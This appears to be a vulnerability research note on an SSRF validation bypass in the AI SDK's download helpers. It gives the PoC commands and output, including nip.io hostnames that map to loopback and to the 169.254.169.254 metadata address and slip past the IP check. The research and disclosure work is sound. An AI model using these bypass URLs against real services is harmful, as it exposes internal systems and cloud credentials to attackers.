# AI SDK Download SSRF Validation Bypass Results

Date: 2026-05-17

Tested versions:

- `ai@6.0.184`
- `@ai-sdk/provider-utils@4.0.27`

Command:

```bash
cd /Users/buddy/Documents/ml_engine/security_research/vercel-open-source/ai-sdk-download-ssrf
npm install
npm run poc
```

Observed output from the packaged PoC:

```text
ai version: 6.0.184
@ai-sdk/provider-utils version: 4.0.27

DNS 127.0.0.1.nip.io -> 127.0.0.1
DNS 169.254.169.254.nip.io -> 169.254.169.254

validateDownloadUrl(http://127.0.0.1:52849/internal) => BLOCKED: URL with IP address 127.0.0.1 is not allowed
validateDownloadUrl(http://127.0.0.1.nip.io:52849/internal) => ALLOWED
validateDownloadUrl(http://169.254.169.254.nip.io/latest/meta-data/) => ALLOWED

LOCAL_SERVER_HIT host=127.0.0.1.nip.io:52849 path=/internal
createDownload() mediaType=text/plain
createDownload() body=AI_SDK_SSRF_LOOPBACK_MARKER

LOCAL_SERVER_HIT host=127.0.0.1.nip.io:52849 path=/internal
downloadBlob() mediaType=text/plain
downloadBlob() body=AI_SDK_SSRF_LOOPBACK_MARKER
```

The PoC uses `ai.createDownload()` and `@ai-sdk/provider-utils.downloadBlob()` directly and prints the marker body retrieved from a loopback-only HTTP server.
